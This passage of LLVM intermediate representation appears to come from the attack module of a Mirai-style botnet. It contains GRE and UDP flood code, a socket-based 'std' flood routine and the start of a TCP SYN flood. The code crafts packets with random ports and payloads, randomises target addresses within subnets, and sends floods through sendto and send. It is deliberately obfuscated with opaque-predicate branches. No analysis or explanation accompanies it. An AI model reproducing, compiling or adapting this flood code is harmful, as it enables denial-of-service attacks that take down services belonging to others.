originalBB88alteredBB:                            ; preds = %originalBB88, %358
  %809 = load i8**, i8*** %11, align 8
  %810 = load i32, i32* %9, align 4
  %811 = sext i32 %810 to i64
  %812 = getelementptr inbounds i8*, i8** %809, i64 %811
  %813 = load i8*, i8** %812, align 8
  store i8* %813, i8** %30, align 8
  %814 = load i8*, i8** %30, align 8
  %815 = bitcast i8* %814 to %struct.iphdr*
  store %struct.iphdr* %815, %struct.iphdr** %31, align 8
  %816 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %817 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %816, i64 1
  %818 = bitcast %struct.iphdr* %817 to %struct.grehdr*
  store %struct.grehdr* %818, %struct.grehdr** %32, align 8
  %819 = load %struct.grehdr*, %struct.grehdr** %32, align 8
  %820 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %819, i64 1
  %821 = bitcast %struct.grehdr* %820 to %struct.ethhdr*
  store %struct.ethhdr* %821, %struct.ethhdr** %33, align 8
  %822 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %823 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %822, i64 1
  %824 = bitcast %struct.ethhdr* %823 to %struct.iphdr*
  store %struct.iphdr* %824, %struct.iphdr** %34, align 8
  %825 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %826 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %825, i64 1
  %827 = bitcast %struct.iphdr* %826 to %struct.udphdr*
  store %struct.udphdr* %827, %struct.udphdr** %35, align 8
  %828 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %829 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %828, i64 1
  %830 = bitcast %struct.udphdr* %829 to i8*
  store i8* %830, i8** %36, align 8
  %831 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %832 = load i32, i32* %9, align 4
  %833 = sext i32 %832 to i64
  %834 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %831, i64 %833
  %835 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %834, i32 0, i32 2
  %836 = load i8, i8* %835, align 4
  %837 = zext i8 %836 to i32
  %838 = icmp slt i32 %837, 32
  br label %originalBB88

originalBB92alteredBB:                            ; preds = %originalBB92, %452
  %839 = load i16, i16* %16, align 2
  %840 = zext i16 %839 to i32
  %841 = icmp eq i32 %840, 65535
  br label %originalBB92

originalBB96alteredBB:                            ; preds = %originalBB96, %472
  %842 = call i32 @rand_next()
  %_97 = shl i32 %842, 65535
  %843 = and i32 %842, 65535
  %844 = trunc i32 %843 to i16
  %845 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %846 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %845, i32 0, i32 0
  store i16 %844, i16* %846, align 2
  br label %originalBB96

originalBB101alteredBB:                           ; preds = %originalBB101, %498
  %847 = call i32 @rand_next()
  %_102 = shl i32 %847, 65535
  %_103 = sub i32 0, %847
  %gen104 = add i32 %_103, 65535
  %848 = and i32 %847, 65535
  %849 = trunc i32 %848 to i16
  %850 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %851 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %850, i32 0, i32 1
  store i16 %849, i16* %851, align 2
  br label %originalBB101

originalBB108alteredBB:                           ; preds = %originalBB108, %520
  %852 = load i8, i8* %20, align 1
  %853 = icmp ne i8 %852, 0
  br label %originalBB108

originalBB112alteredBB:                           ; preds = %originalBB112, %577
  %854 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %855 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %854, i32 0, i32 7
  store i16 0, i16* %855, align 2
  %856 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %857 = bitcast %struct.iphdr* %856 to i16*
  %858 = call zeroext i16 @checksum_generic(i16* %857, i32 20)
  %859 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %860 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %859, i32 0, i32 7
  store i16 %858, i16* %860, align 2
  %861 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %862 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %861, i32 0, i32 7
  store i16 0, i16* %862, align 2
  %863 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %864 = bitcast %struct.iphdr* %863 to i16*
  %865 = call zeroext i16 @checksum_generic(i16* %864, i32 20)
  %866 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %867 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %866, i32 0, i32 7
  store i16 %865, i16* %867, align 2
  %868 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %869 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %868, i32 0, i32 3
  store i16 0, i16* %869, align 2
  %870 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %871 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %872 = bitcast %struct.udphdr* %871 to i8*
  %873 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %874 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %873, i32 0, i32 2
  %875 = load i16, i16* %874, align 2
  %876 = load i32, i32* %18, align 4
  %877 = sext i32 %876 to i64
  %_113 = shl i64 8, %877
  %_114 = sub i64 8, %877
  %gen115 = mul i64 %_114, %877
  %_116 = sub i64 8, %877
  %gen117 = mul i64 %_116, %877
  %_118 = sub i64 0, 8
  %gen119 = add i64 %_118, %877
  %_120 = sub i64 8, %877
  %gen121 = mul i64 %_120, %877
  %_122 = sub i64 0, 8
  %gen123 = add i64 %_122, %877
  %_124 = shl i64 8, %877
  %878 = add i64 8, %877
  %879 = trunc i64 %878 to i32
  %880 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %870, i8* %872, i16 zeroext %875, i32 %879)
  %881 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %882 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %881, i32 0, i32 3
  store i16 %880, i16* %882, align 2
  %883 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %884 = load i32, i32* %9, align 4
  %885 = sext i32 %884 to i64
  %886 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %883, i64 %885
  %887 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %886, i32 0, i32 0
  %888 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %887, i32 0, i32 0
  store i16 2, i16* %888, align 4
  %889 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %890 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %889, i32 0, i32 9
  %891 = load i32, i32* %890, align 4
  %892 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %893 = load i32, i32* %9, align 4
  %894 = sext i32 %893 to i64
  %895 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %892, i64 %894
  %896 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %895, i32 0, i32 0
  %897 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %896, i32 0, i32 2
  %898 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %897, i32 0, i32 0
  store i32 %891, i32* %898, align 4
  %899 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %900 = load i32, i32* %9, align 4
  %901 = sext i32 %900 to i64
  %902 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %899, i64 %901
  %903 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %902, i32 0, i32 0
  %904 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %903, i32 0, i32 1
  store i16 0, i16* %904, align 2
  %905 = load i32, i32* %10, align 4
  %906 = load i8*, i8** %30, align 8
  %907 = load i32, i32* %18, align 4
  %908 = sext i32 %907 to i64
  %_125 = sub i64 0, 66
  %gen126 = add i64 %_125, %908
  %_127 = shl i64 66, %908
  %_128 = sub i64 0, 66
  %gen129 = add i64 %_128, %908
  %_130 = shl i64 66, %908
  %909 = add i64 66, %908
  %910 = bitcast %union.__CONST_SOCKADDR_ARG* %40 to %struct.sockaddr**
  %911 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %912 = load i32, i32* %9, align 4
  %913 = sext i32 %912 to i64
  %914 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %911, i64 %913
  %915 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %914, i32 0, i32 0
  %916 = bitcast %struct.sockaddr_in* %915 to %struct.sockaddr*
  store %struct.sockaddr* %916, %struct.sockaddr** %910, align 8
  %917 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %40, i32 0, i32 0
  %918 = load %struct.sockaddr*, %struct.sockaddr** %917, align 8
  %919 = call i64 @sendto(i32 %905, i8* %906, i64 %909, i32 16384, %struct.sockaddr* %918, i32 16)
  br label %originalBB112

originalBB134alteredBB:                           ; preds = %originalBB134, %663
  br label %originalBB134
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_std(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i8**, align 8
  %11 = alloca i32*, align 8
  %12 = alloca i16, align 2
  %13 = alloca i16, align 2
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca %struct.iphdr*, align 8
  %18 = alloca %struct.udphdr*, align 8
  %19 = alloca i8*, align 8
  %20 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %21 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %22 = alloca i8*, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %23 = load i8, i8* %5, align 1
  %24 = zext i8 %23 to i64
  %25 = call noalias i8* @calloc(i64 %24, i64 8) #6
  %26 = bitcast i8* %25 to i8**
  store i8** %26, i8*** %10, align 8
  %27 = load i8, i8* %5, align 1
  %28 = zext i8 %27 to i64
  %29 = call noalias i8* @calloc(i64 %28, i64 4) #6
  %30 = bitcast i8* %29 to i32*
  store i32* %30, i32** %11, align 8
  %31 = load i8, i8* %7, align 1
  %32 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %33 = call i32 @attack_get_opt_int(i8 zeroext %31, %struct.attack_option* %32, i8 zeroext 7, i32 65535)
  %34 = trunc i32 %33 to i16
  store i16 %34, i16* %12, align 2
  %35 = load i8, i8* %7, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %37 = call i32 @attack_get_opt_int(i8 zeroext %35, %struct.attack_option* %36, i8 zeroext 6, i32 65535)
  %38 = trunc i32 %37 to i16
  store i16 %38, i16* %13, align 2
  %39 = load i8, i8* %7, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %41 = call i32 @attack_get_opt_int(i8 zeroext %39, %struct.attack_option* %40, i8 zeroext 0, i32 1024)
  %42 = trunc i32 %41 to i16
  store i16 %42, i16* %14, align 2
  %43 = load i8, i8* %7, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 1, i32 1)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %15, align 1
  %47 = bitcast %struct.sockaddr_in* %16 to i8*
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 16, i32 4, i1 false)
  %48 = load i16, i16* %13, align 2
  %49 = zext i16 %48 to i32
  %50 = icmp eq i32 %49, 65535
  br i1 %50, label %51, label %54

; <label>:51:                                     ; preds = %4
  %52 = call i32 @rand_next()
  %53 = trunc i32 %52 to i16
  store i16 %53, i16* %13, align 2
  br label %73

; <label>:54:                                     ; preds = %4
  %55 = load i32, i32* @x.23
  %56 = load i32, i32* @y.24
  %57 = sub i32 %55, 1
  %58 = mul i32 %55, %57
  %59 = urem i32 %58, 2
  %60 = icmp eq i32 %59, 0
  %61 = icmp slt i32 %56, 10
  %62 = or i1 %60, %61
  br i1 %62, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %54
  %63 = load i16, i16* %13, align 2
  %64 = call zeroext i16 @htons(i16 zeroext %63) #7
  store i16 %64, i16* %13, align 2
  %65 = load i32, i32* @x.23
  %66 = load i32, i32* @y.24
  %67 = sub i32 %65, 1
  %68 = mul i32 %65, %67
  %69 = urem i32 %68, 2
  %70 = icmp eq i32 %69, 0
  %71 = icmp slt i32 %66, 10
  %72 = or i1 %70, %71
  br i1 %72, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %73

; <label>:73:                                     ; preds = %originalBBpart2, %51
  %74 = load i32, i32* @x.23
  %75 = load i32, i32* @y.24
  %76 = sub i32 %74, 1
  %77 = mul i32 %74, %76
  %78 = urem i32 %77, 2
  %79 = icmp eq i32 %78, 0
  %80 = icmp slt i32 %75, 10
  %81 = or i1 %79, %80
  br i1 %81, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %73
  store i32 0, i32* %9, align 4
  %82 = load i32, i32* @x.23
  %83 = load i32, i32* @y.24
  %84 = sub i32 %82, 1
  %85 = mul i32 %82, %84
  %86 = urem i32 %85, 2
  %87 = icmp eq i32 %86, 0
  %88 = icmp slt i32 %83, 10
  %89 = or i1 %87, %88
  br i1 %89, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %90

; <label>:90:                                     ; preds = %250, %originalBBpart24
  %91 = load i32, i32* @x.23
  %92 = load i32, i32* @y.24
  %93 = sub i32 %91, 1
  %94 = mul i32 %91, %93
  %95 = urem i32 %94, 2
  %96 = icmp eq i32 %95, 0
  %97 = icmp slt i32 %92, 10
  %98 = or i1 %96, %97
  br i1 %98, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %90
  %99 = load i32, i32* %9, align 4
  %100 = load i8, i8* %5, align 1
  %101 = zext i8 %100 to i32
  %102 = icmp slt i32 %99, %101
  %103 = load i32, i32* @x.23
  %104 = load i32, i32* @y.24
  %105 = sub i32 %103, 1
  %106 = mul i32 %103, %105
  %107 = urem i32 %106, 2
  %108 = icmp eq i32 %107, 0
  %109 = icmp slt i32 %104, 10
  %110 = or i1 %108, %109
  br i1 %110, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %102, label %111, label %253

; <label>:111:                                    ; preds = %originalBBpart28
  %112 = call noalias i8* @calloc(i64 65535, i64 1) #6
  %113 = load i8**, i8*** %10, align 8
  %114 = load i32, i32* %9, align 4
  %115 = sext i32 %114 to i64
  %116 = getelementptr inbounds i8*, i8** %113, i64 %115
  store i8* %112, i8** %116, align 8
  %117 = load i16, i16* %12, align 2
  %118 = zext i16 %117 to i32
  %119 = icmp eq i32 %118, 65535
  br i1 %119, label %120, label %129

; <label>:120:                                    ; preds = %111
  %121 = call i32 @rand_next()
  %122 = trunc i32 %121 to i16
  %123 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %124 = load i32, i32* %9, align 4
  %125 = sext i32 %124 to i64
  %126 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %123, i64 %125
  %127 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %126, i32 0, i32 0
  %128 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %127, i32 0, i32 1
  store i16 %122, i16* %128, align 2
  br label %138

; <label>:129:                                    ; preds = %111
  %130 = load i16, i16* %12, align 2
  %131 = call zeroext i16 @htons(i16 zeroext %130) #7
  %132 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %133 = load i32, i32* %9, align 4
  %134 = sext i32 %133 to i64
  %135 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %132, i64 %134
  %136 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %135, i32 0, i32 0
  %137 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %136, i32 0, i32 1
  store i16 %131, i16* %137, align 2
  br label %138

; <label>:138:                                    ; preds = %129, %120
  %139 = load i32, i32* @x.23
  %140 = load i32, i32* @y.24
  %141 = sub i32 %139, 1
  %142 = mul i32 %139, %141
  %143 = urem i32 %142, 2
  %144 = icmp eq i32 %143, 0
  %145 = icmp slt i32 %140, 10
  %146 = or i1 %144, %145
  br i1 %146, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %138
  %147 = call i32 @socket(i32 2, i32 2, i32 0) #6
  %148 = load i32*, i32** %11, align 8
  %149 = load i32, i32* %9, align 4
  %150 = sext i32 %149 to i64
  %151 = getelementptr inbounds i32, i32* %148, i64 %150
  store i32 %147, i32* %151, align 4
  %152 = icmp eq i32 %147, -1
  %153 = load i32, i32* @x.23
  %154 = load i32, i32* @y.24
  %155 = sub i32 %153, 1
  %156 = mul i32 %153, %155
  %157 = urem i32 %156, 2
  %158 = icmp eq i32 %157, 0
  %159 = icmp slt i32 %154, 10
  %160 = or i1 %158, %159
  br i1 %160, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %152, label %161, label %162

; <label>:161:                                    ; preds = %originalBBpart212
  ret void

; <label>:162:                                    ; preds = %originalBBpart212
  %163 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %163, align 4
  %164 = load i16, i16* %13, align 2
  %165 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %164, i16* %165, align 2
  %166 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %167 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %166, i32 0, i32 0
  store i32 0, i32* %167, align 4
  %168 = load i32*, i32** %11, align 8
  %169 = load i32, i32* %9, align 4
  %170 = sext i32 %169 to i64
  %171 = getelementptr inbounds i32, i32* %168, i64 %170
  %172 = load i32, i32* %171, align 4
  %173 = bitcast %union.__CONST_SOCKADDR_ARG* %20 to %struct.sockaddr**
  %174 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  store %struct.sockaddr* %174, %struct.sockaddr** %173, align 8
  %175 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %20, i32 0, i32 0
  %176 = load %struct.sockaddr*, %struct.sockaddr** %175, align 8
  %177 = call i32 @bind(i32 %172, %struct.sockaddr* %176, i32 16) #6
  %178 = icmp eq i32 %177, -1
  br i1 %178, label %179, label %180

; <label>:179:                                    ; preds = %162
  br label %180

; <label>:180:                                    ; preds = %179, %162
  %181 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %182 = load i32, i32* %9, align 4
  %183 = sext i32 %182 to i64
  %184 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %181, i64 %183
  %185 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %184, i32 0, i32 2
  %186 = load i8, i8* %185, align 4
  %187 = zext i8 %186 to i32
  %188 = icmp slt i32 %187, 32
  br i1 %188, label %189, label %215

; <label>:189:                                    ; preds = %180
  %190 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %191 = load i32, i32* %9, align 4
  %192 = sext i32 %191 to i64
  %193 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %190, i64 %192
  %194 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %193, i32 0, i32 1
  %195 = load i32, i32* %194, align 4
  %196 = call i32 @ntohl(i32 %195) #7
  %197 = call i32 @rand_next()
  %198 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %199 = load i32, i32* %9, align 4
  %200 = sext i32 %199 to i64
  %201 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %198, i64 %200
  %202 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %201, i32 0, i32 2
  %203 = load i8, i8* %202, align 4
  %204 = zext i8 %203 to i32
  %205 = lshr i32 %197, %204
  %206 = add i32 %196, %205
  %207 = call i32 @htonl(i32 %206) #7
  %208 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %209 = load i32, i32* %9, align 4
  %210 = sext i32 %209 to i64
  %211 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %208, i64 %210
  %212 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %211, i32 0, i32 0
  %213 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %212, i32 0, i32 2
  %214 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %213, i32 0, i32 0
  store i32 %207, i32* %214, align 4
  br label %215

; <label>:215:                                    ; preds = %189, %180
  %216 = load i32, i32* @x.23
  %217 = load i32, i32* @y.24
  %218 = sub i32 %216, 1
  %219 = mul i32 %216, %218
  %220 = urem i32 %219, 2
  %221 = icmp eq i32 %220, 0
  %222 = icmp slt i32 %217, 10
  %223 = or i1 %221, %222
  br i1 %223, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %215
  %224 = load i32*, i32** %11, align 8
  %225 = load i32, i32* %9, align 4
  %226 = sext i32 %225 to i64
  %227 = getelementptr inbounds i32, i32* %224, i64 %226
  %228 = load i32, i32* %227, align 4
  %229 = bitcast %union.__CONST_SOCKADDR_ARG* %21 to %struct.sockaddr**
  %230 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %231 = load i32, i32* %9, align 4
  %232 = sext i32 %231 to i64
  %233 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %230, i64 %232
  %234 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %233, i32 0, i32 0
  %235 = bitcast %struct.sockaddr_in* %234 to %struct.sockaddr*
  store %struct.sockaddr* %235, %struct.sockaddr** %229, align 8
  %236 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %21, i32 0, i32 0
  %237 = load %struct.sockaddr*, %struct.sockaddr** %236, align 8
  %238 = call i32 @connect(i32 %228, %struct.sockaddr* %237, i32 16)
  %239 = icmp eq i32 %238, -1
  %240 = load i32, i32* @x.23
  %241 = load i32, i32* @y.24
  %242 = sub i32 %240, 1
  %243 = mul i32 %240, %242
  %244 = urem i32 %243, 2
  %245 = icmp eq i32 %244, 0
  %246 = icmp slt i32 %241, 10
  %247 = or i1 %245, %246
  br i1 %247, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %239, label %248, label %249

; <label>:248:                                    ; preds = %originalBBpart216
  br label %249

; <label>:249:                                    ; preds = %248, %originalBBpart216
  br label %250

; <label>:250:                                    ; preds = %249
  %251 = load i32, i32* %9, align 4
  %252 = add nsw i32 %251, 1
  store i32 %252, i32* %9, align 4
  br label %90

; <label>:253:                                    ; preds = %originalBBpart28
  %254 = load i32, i32* @x.23
  %255 = load i32, i32* @y.24
  %256 = sub i32 %254, 1
  %257 = mul i32 %254, %256
  %258 = urem i32 %257, 2
  %259 = icmp eq i32 %258, 0
  %260 = icmp slt i32 %255, 10
  %261 = or i1 %259, %260
  br i1 %261, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %253
  %262 = load i32, i32* @x.23
  %263 = load i32, i32* @y.24
  %264 = sub i32 %262, 1
  %265 = mul i32 %262, %264
  %266 = urem i32 %265, 2
  %267 = icmp eq i32 %266, 0
  %268 = icmp slt i32 %263, 10
  %269 = or i1 %267, %268
  br i1 %269, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %270

; <label>:270:                                    ; preds = %originalBBpart224, %originalBBpart220
  store i32 0, i32* %9, align 4
  br label %271

; <label>:271:                                    ; preds = %298, %270
  %272 = load i32, i32* %9, align 4
  %273 = load i8, i8* %5, align 1
  %274 = zext i8 %273 to i32
  %275 = icmp slt i32 %272, %274
  br i1 %275, label %276, label %301

; <label>:276:                                    ; preds = %271
  %277 = load i8**, i8*** %10, align 8
  %278 = load i32, i32* %9, align 4
  %279 = sext i32 %278 to i64
  %280 = getelementptr inbounds i8*, i8** %277, i64 %279
  %281 = load i8*, i8** %280, align 8
  store i8* %281, i8** %22, align 8
  %282 = load i8, i8* %15, align 1
  %283 = icmp ne i8 %282, 0
  br i1 %283, label %284, label %288

; <label>:284:                                    ; preds = %276
  %285 = load i8*, i8** %22, align 8
  %286 = load i16, i16* %14, align 2
  %287 = zext i16 %286 to i32
  call void @rand_str(i8* %285, i32 %287)
  br label %288

; <label>:288:                                    ; preds = %284, %276
  %289 = load i32*, i32** %11, align 8
  %290 = load i32, i32* %9, align 4
  %291 = sext i32 %290 to i64
  %292 = getelementptr inbounds i32, i32* %289, i64 %291
  %293 = load i32, i32* %292, align 4
  %294 = load i8*, i8** %22, align 8
  %295 = load i16, i16* %14, align 2
  %296 = zext i16 %295 to i64
  %297 = call i64 @send(i32 %293, i8* %294, i64 %296, i32 16384)
  br label %298

; <label>:298:                                    ; preds = %288
  %299 = load i32, i32* %9, align 4
  %300 = add nsw i32 %299, 1
  store i32 %300, i32* %9, align 4
  br label %271

; <label>:301:                                    ; preds = %271
  %302 = load i32, i32* @x.23
  %303 = load i32, i32* @y.24
  %304 = sub i32 %302, 1
  %305 = mul i32 %302, %304
  %306 = urem i32 %305, 2
  %307 = icmp eq i32 %306, 0
  %308 = icmp slt i32 %303, 10
  %309 = or i1 %307, %308
  br i1 %309, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %301
  %310 = load i32, i32* @x.23
  %311 = load i32, i32* @y.24
  %312 = sub i32 %310, 1
  %313 = mul i32 %310, %312
  %314 = urem i32 %313, 2
  %315 = icmp eq i32 %314, 0
  %316 = icmp slt i32 %311, 10
  %317 = or i1 %315, %316
  br i1 %317, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %270

originalBBalteredBB:                              ; preds = %originalBB, %54
  %318 = load i16, i16* %13, align 2
  %319 = call zeroext i16 @htons(i16 zeroext %318) #7
  store i16 %319, i16* %13, align 2
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %73
  store i32 0, i32* %9, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %90
  %320 = load i32, i32* %9, align 4
  %321 = load i8, i8* %5, align 1
  %322 = zext i8 %321 to i32
  %323 = icmp slt i32 %320, %322
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %138
  %324 = call i32 @socket(i32 2, i32 2, i32 0) #6
  %325 = load i32*, i32** %11, align 8
  %326 = load i32, i32* %9, align 4
  %327 = sext i32 %326 to i64
  %328 = getelementptr inbounds i32, i32* %325, i64 %327
  store i32 %324, i32* %328, align 4
  %329 = icmp eq i32 %324, -1
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %215
  %330 = load i32*, i32** %11, align 8
  %331 = load i32, i32* %9, align 4
  %332 = sext i32 %331 to i64
  %333 = getelementptr inbounds i32, i32* %330, i64 %332
  %334 = load i32, i32* %333, align 4
  %335 = bitcast %union.__CONST_SOCKADDR_ARG* %21 to %struct.sockaddr**
  %336 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %337 = load i32, i32* %9, align 4
  %338 = sext i32 %337 to i64
  %339 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %336, i64 %338
  %340 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %339, i32 0, i32 0
  %341 = bitcast %struct.sockaddr_in* %340 to %struct.sockaddr*
  store %struct.sockaddr* %341, %struct.sockaddr** %335, align 8
  %342 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %21, i32 0, i32 0
  %343 = load %struct.sockaddr*, %struct.sockaddr** %342, align 8
  %344 = call i32 @connect(i32 %334, %struct.sockaddr* %343, i32 16)
  %345 = icmp eq i32 %344, -1
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %253
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %301
  br label %originalBB22
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #1

declare i32 @connect(i32, %struct.sockaddr*, i32) #3

declare i64 @send(i32, i8*, i64, i32) #3

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpsyn(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.tcphdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca i8*, align 8
  %31 = alloca %struct.iphdr*, align 8
